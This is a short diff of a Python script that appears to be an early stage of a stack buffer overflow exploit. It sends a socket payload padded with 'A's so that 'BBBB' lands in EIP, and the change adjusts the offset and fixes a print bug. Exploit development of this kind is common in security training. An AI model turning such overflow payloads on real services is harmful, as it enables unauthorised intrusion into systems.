@@ -16,10 +16,10 @@ response = sock.recv(2048)
 print(response)
 
 #try giving input of a specific length to have only BBBB in EIP
-length = 504
+length = 516
 payload = "A"*length + "BBBB" + "C"*10
 
-print("Sending Payload of size " + length)
+print("Sending Payload of size " + str(length))
 sock.send(payload.encode())
 
 response = sock.recv(2048)
